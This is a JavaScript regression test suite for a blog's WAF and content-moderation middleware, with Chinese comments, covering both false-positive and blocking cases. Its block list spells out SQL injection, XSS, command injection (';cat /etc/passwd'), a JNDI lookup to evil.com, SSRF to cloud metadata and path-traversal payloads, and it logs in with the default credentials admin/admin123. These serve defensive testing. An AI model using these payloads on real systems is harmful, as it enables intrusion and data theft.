/**
 * 误杀回归测试套件（真实用户内容必须放行 + 攻击载荷必须拦截）
 * 双层：
 *  - 进程内单测：scanText / antiSpam / aiModeration / requestGuard（快速、无状态污染）
 *  - HTTP 端到端：通用 UA 放行、favicon 404 豁免、可信 IP 白名单、安全配置接口
 * 前置：测试运行器已重置 ip_bans 并重启服务
 */
const c = require('./client');
const { scanText, RULE_INDEX } = require('../src/middleware/waf');
const { antiSpam, checkSensitive } = require('../src/utils/antiSpam');
const { localModeration } = require('../src/utils/aiModeration');
const { timestampRequired, refererRequired } = require('../src/middleware/requestGuard');
const { getConfig } = require('../src/utils/securitySettings');

let passed = 0, failed = 0;
const failures = [];

function assert(name, cond, extra = '') {
  if (cond) { passed++; console.log(`  ✓ ${name}`); }
  else { failed++; failures.push(name + (extra ? ' | ' + extra : '')); console.log(`  ✗ ${name} ${extra}`); }
}

/** requestGuard 单测辅助：执行中间件并返回 'next' | 状态码 */
function runGuard(fn, headers) {
  let out = null;
  const res = { status: (s) => { out = s; return { json: () => {} }; } };
  fn({ headers, method: 'POST', originalUrl: '/api/comments' }, res, () => { out = 'next'; });
  return out;
}

async function unitTests() {
  console.log('\n=== 1. WAF 误杀回归（这些内容必须放行） ===');
  const passCases = [
    ['英文散文含 select/from', 'you can select the color from the palette', 'body'],
    ['英文口语引号+or', "it's orange and it's delicious", 'query'],
    ['#数字 标题形态', '#1 标题 41 期', 'query'],
    ['常规参数名 online=1', 'online=1', 'query'],
    ['concat( 普通文本', 'use concat(a, b) in js? no this is body text', 'body'],
    ['昵称 localhost', 'localhost', 'body'],
    ['昵称 JavaScript 冒号', 'JavaScript:从入门到放弃', 'body'],
    ['网站字段带端口', 'https://blog.example.com:8443/about', 'body'],
    ['git clone 技术讨论', 'git clone 到本地后运行', 'body'],
    ['科学计数法文本', '质量约为 1e5=100000 倍', 'query'],
    ['十六进制颜色', '#4a90d9 是主题色', 'query'],
    ['模板字符串查询', 'how to use ${name} in vue template', 'body'],
  ];
  for (const [name, text, scope] of passCases) {
    const hit = scanText(text, scope);
    assert(`放行 ${name}`, hit === null, hit ? `被 ${hit.id} 拦截` : '');
  }
  // SSRF 字段限定：URL 形态字段才查内网地址
  assert('放行 网站=内网 IP（非 URL 字段上下文）', scanText('我的服务器是 192.168.1.50', 'body') === null);
  assert('放行 昵称 127.0.0.1（body 无 SSRF）', scanText('127.0.0.1', 'body') === null);

  console.log('\n=== 2. WAF 攻击载荷（必须拦截） ===');
  const blockCases = [
    ['SQL 同义态', "1' or '1'='1", 'SQL'],
    ['SQL 数字同义态', "1' OR 1=1 --", 'SQL'],
    ['SQL UNION', 'union select 1,2,3', 'SQL'],
    ['SQL 盲注', '1 AND SLEEP(5)', 'SQL'],
    ['SQL 内联注释混淆', 'uni/*x*/on sel/*x*/ect', 'SQL'],
    ['SQL 报错注入', "1' and extractvalue(1,concat(0x7e,user())) --", 'SQL'],
    ['XSS 事件处理器', '<img src=x onerror=alert(1)>', 'XSS'],
    ['XSS svg onload', '<svg/onload=alert(1)>', 'XSS'],
    ['XSS 属性注入', '" onmouseover="alert(1)', 'XSS'],
    ['XSS 伪协议赋值', '<a href="javascript:alert(1)">x</a>', 'XSS'],
    ['SQL 注释混淆（裸）', "admin'--", 'SQL'],
    ['命令注入', ';cat /etc/passwd', 'CMD'],
    ['命令注入 管道', '| whoami', 'CMD'],
    ['JNDI', '${jndi:ldap://evil.com/a}', 'CMD'],
    ['FastJSON', '{"@type":"java.lang.Runtime"}', 'MISC'],
    ['SSTI', '{{7*7}}', 'MISC'],
    ['CRLF（query）', 'a%0d%0aSet-Cookie:x=1', 'MISC'],
    ['路径遍历', '../../../etc/passwd', 'TRAVERSAL'],
    ['空字节', '/etc/passwd%00.png', 'TRAVERSAL'],
    ['原型污染', '__proto__', 'MISC'],
  ];
  for (const [name, text, group] of blockCases) {
    const hit = scanText(text, 'query');
    assert(`拦截 ${name}`, hit !== null && hit.group === group, hit ? `命中 ${hit.group}` : '未拦截');
  }
  // SSRF：URL 字段与 query 生效
  assert('拦截 SSRF query 内网', scanText('http://192.168.1.1/admin', 'query') !== null);
  assert('拦截 SSRF 网站=内网 IP', scanText('http://192.168.1.50', 'body', { urlKey: true }) !== null);
  assert('拦截 SSRF 云元数据', scanText('http://169.254.169.254/latest/meta-data/', 'query') !== null);

  console.log('\n=== 3. 规则索引完整性 ===');
  const ids = Object.keys(RULE_INDEX);
  assert('规则 ID 唯一', new Set(ids).size === ids.length, `${ids.length} 条`);
  assert('规则均带说明', Object.values(RULE_INDEX).every((r) => r.note && r.group));

  console.log('\n=== 4. 内容审核误杀回归 ===');
  const modPass = [
    ['method 高频英文', '这篇 method 讲解很清楚，whether 和 if 的区别也讲到了'],
    ['Java 垃圾回收', 'Java 垃圾回收这段写得好，G1 的设计很精妙'],
    ['智能合约/代理模式', '智能合约安全值得研究，设计模式里的代理模式也常用'],
    ['含链接的技术评论', '参考这篇：https://developer.mozilla.org/zh-CN/docs/Web/API'],
    ['VxWorks 不命中 vx', '我们工控项目用的 VxWorks 系统'],
  ];
  for (const [name, text] of modPass) {
    const r = localModeration(text, '测试者', '');
    assert(`审核放行 ${name}`, r.score < 30, `score=${r.score} ${r.reasons.join('、')}`);
  }
  const modBlock = [
    ['usdt 合约群带单', 'usdt 合约群带单，日赚千元'],
    ['兼职刷单返利', '兼职刷单返利，加微信看师资'],
    ['明确辱骂', '楼主就是个傻逼'],
  ];
  for (const [name, text] of modBlock) {
    const r = localModeration(text, '', '');
    assert(`审核拦截 ${name}`, r.score >= 30, `score=${r.score}`);
  }
  assert('硬拒 裸聊', antiSpam('裸聊加我').ok === false);
  assert('硬拒 加微信', antiSpam('加微信聊聊').ok === false);
  assert('放行 1 条链接', antiSpam('看 https://example.com/a 这篇').ok === true);
  assert('放行 3 条链接', antiSpam('a https://a.com b https://b.com c https://c.com').ok === true);
  assert('拒绝 4 条链接', antiSpam('a https://a.com b https://b.com c https://c.com d https://d.com').ok === false);
  const vxHit = checkSensitive('VxWorks 实时系统讨论');
  assert('vx 词边界（VxWorks 不命中）', vxHit.length === 0, JSON.stringify(vxHit));

  console.log('\n=== 5. requestGuard 放宽 ===');
  const t29 = runGuard(timestampRequired, { 'x-timestamp': String(Date.now() - 29 * 60 * 1000) });
  assert('±29 分钟时间戳放行', t29 === 'next', `result=${t29}`);
  const t31 = runGuard(timestampRequired, { 'x-timestamp': String(Date.now() - 31 * 60 * 1000) });
  assert('±31 分钟时间戳拒绝', t31 === 403, `result=${t31}`);
  // 未签名 + Origin:null → requestGuard 仍拒绝（无签名不旁路）
  const onull = runGuard(refererRequired, { origin: 'null' });
  assert('未签名 Origin:null 仍拒绝', onull === 403, `result=${onull}`);
  const onull2 = runGuard(refererRequired, { origin: 'http://localhost:5173' });
  assert('合法本地 Origin 放行', onull2 === 'next', `result=${onull2}`);

  console.log('\n=== 6. 默认安全配置 ===');
  const cfg = getConfig();
  assert('六组规则默认开启', Object.values(cfg.groups).every(Boolean));
  assert('默认无禁用规则', cfg.disabledRules.length === 0);
  assert('banCount 老化默认 30 天', cfg.banCountResetDays === 30);
}

async function httpTests() {
  console.log('\n=== 7. HTTP：通用客户端放行（gate-skip 通道） ===');
  let r = await c.req('GET', '/api/rss.xml', { headers: { 'User-Agent': 'curl/8.4.0' }, silent: true });
  assert('curl 拉 RSS 放行', r.status === 200, `status=${r.status}`);
  r = await c.req('GET', '/api/rss.xml', { headers: { 'User-Agent': 'python-requests/2.31' }, silent: true });
  assert('python-requests 拉 RSS 放行', r.status === 200, `status=${r.status}`);
  r = await c.req('GET', '/api/health', { headers: { 'User-Agent': 'UptimeRobot/2.0' }, silent: true });
  assert('监控 UA 探活放行', r.status === 200, `status=${r.status}`);
  r = await c.req('GET', '/api/health', { headers: { 'User-Agent': 'sqlmap/1.7' }, silent: true });
  assert('sqlmap UA 仍拦截', r.status === 403, `status=${r.status}`);
  r = await c.req('GET', '/robots.txt', { headers: { 'User-Agent': 'Mozilla/5.0 test' }, silent: true });
  assert('robots.txt 放行', r.status === 200, `status=${r.status}`);

  console.log('\n=== 8. HTTP：误杀内容经真实请求放行 ===');
  const ticket = await c.getTicket();
  r = await c.req('GET', '/api/articles?online=1&page=1', { ticket, silent: true });
  assert('?online=1 放行（曾触发 XSS 规则）', r.status === 200, `status=${r.status}`);
  r = await c.req('GET', '/api/articles?keyword=' + encodeURIComponent('select the color from the palette'), { ticket, silent: true });
  assert('散文搜索放行', r.status === 200, `status=${r.status}`);

  console.log('\n=== 9. HTTP：favicon 404 风暴不触发封禁 ===');
  let last = 0;
  for (let i = 0; i < 15; i++) {
    last = (await c.req('GET', '/favicon.ico', { headers: { 'User-Agent': 'Mozilla/5.0 storm' }, silent: true })).status;
  }
  assert('favicon 404 正常返回', last === 404, `status=${last}`);
  const t2 = await c.getTicket();
  r = await c.req('GET', '/api/articles', { ticket: t2, silent: true });
  assert('风暴后未被误封（读接口正常）', r.status === 200, `status=${r.status}`);
}

async function adminTests() {
  console.log('\n=== 10. HTTP：安全配置接口 + 可信 IP 白名单 ===');
  // 指纹必须与 getTicket 签发票据所用指纹一致（client 默认 'a'.repeat(64)）
  const FP = 'a'.repeat(64);
  const ticket = await c.getTicket();
  let r = await c.req('POST', '/api/auth/login', {
    body: { username: 'admin', password: 'admin123' },
    ticket,
    headers: { 'X-Fp': FP, Origin: 'http://localhost:5173', Referer: 'http://localhost:5173/' },
    silent: true,
  });
  assert('管理员登录', r.status === 200 && r.body?.data?.token, `status=${r.status}`);
  if (r.status !== 200) return;
  const token = r.body.data.token;
  // admin-path 要求有效票据（防未完成 PoW 的脚本拿到后台地址）
  const apRes = await c.req('GET', '/api/anti/admin-path', { ticket, silent: true });
  assert('获取后台秘钥路径', apRes.status === 200 && apRes.body?.data?.path, `status=${apRes.status}`);
  const adminBase = `/api/${apRes.body?.data?.path || 'admin'}`;
  // admin 接口要求 X-Fp 指纹头（与登录指纹一致）
  const adminHeaders = { Authorization: `Bearer ${token}`, 'X-Fp': FP };
  const b64 = (s) => Buffer.from(s, 'utf8').toString('base64');

  // admin 路径同样经过 PoW 闸门：全部请求需带票据（client 自动签名）
  r = await c.req('GET', `${adminBase}/security/config`, { ticket, headers: adminHeaders, silent: true });
  assert('读取安全配置', r.status === 200 && r.body?.data?.config, `status=${r.status}`);
  const ruleCount = (r.body?.data?.rules || []).length;
  assert('规则索引下发（>100 条）', ruleCount > 100, `count=${ruleCount}`);

  r = await c.req('POST', `${adminBase}/security/test`, { body: { text_b64: b64("1' or 1=1 --") }, ticket, headers: adminHeaders, silent: true });
  assert('规则测试器命中 SQL', r.status === 200 && r.body?.data?.hits?.length > 0, `status=${r.status} ${JSON.stringify(r.body)}`);
  r = await c.req('POST', `${adminBase}/security/test`, { body: { text_b64: b64('select the color from the palette') }, ticket, headers: adminHeaders, silent: true });
  assert('规则测试器放行散文', r.status === 200 && r.body?.data?.hits?.length === 0, `hits=${JSON.stringify(r.body?.data?.hits)}`);

  // 保存坏配置必须被拒（400）
  r = await c.req('PUT', `${adminBase}/security/config`, { body: { trustedIps: ['not-an-ip'] }, ticket, headers: adminHeaders, silent: true });
  assert('非法 CIDR 被拒', r.status === 400, `status=${r.status}`);
  r = await c.req('PUT', `${adminBase}/security/config`, { body: { disabledRules: ['NOPE-99'] }, ticket, headers: adminHeaders, silent: true });
  assert('未知规则 ID 被拒', r.status === 400, `status=${r.status}`);

  // 可信 IP 白名单端到端：把本机 IP 加入白名单后 WAF 命中不再记分
  r = await c.req('PUT', `${adminBase}/security/config`, {
    body: { trustedIps: ['127.0.0.1', '::1', '::ffff:127.0.0.1'] },
    ticket, headers: adminHeaders, silent: true,
  });
  assert('保存白名单', r.status === 200, `status=${r.status} ${JSON.stringify(r.body)}`);
  if (r.status === 200) {
    const ticket2 = await c.getTicket();
    // 连续 6 次 WAF 命中（权重 3×6=18 ≥ 10）——若仍记分必然触发封禁
    for (let i = 0; i < 6; i++) {
      await c.req('GET', "/api/articles?search=1'%20OR%201=1%20--", { ticket: ticket2, silent: true });
    }
    const t3 = await c.getTicket();
    r = await c.req('GET', '/api/articles', { ticket: t3, silent: true });
    assert('白名单 IP 连续 WAF 命中不被封禁', r.status === 200, `status=${r.status}`);
    // 清空白名单，恢复原状
    await c.req('PUT', `${adminBase}/security/config`, { body: { trustedIps: [] }, ticket, headers: adminHeaders, silent: true });
    assert('清空白名单', true);
  }
}

async function suite() {
  await unitTests();
  await httpTests();
  await adminTests();
  console.log(`\n===== 结果: ${passed} 通过 / ${failed} 失败 =====`);
  if (failures.length) {
    console.log('失败项:');
    failures.forEach((f) => console.log('  - ' + f));
    process.exit(1);
  }
}

suite().catch((e) => { console.error('测试执行异常:', e); process.exit(1); });
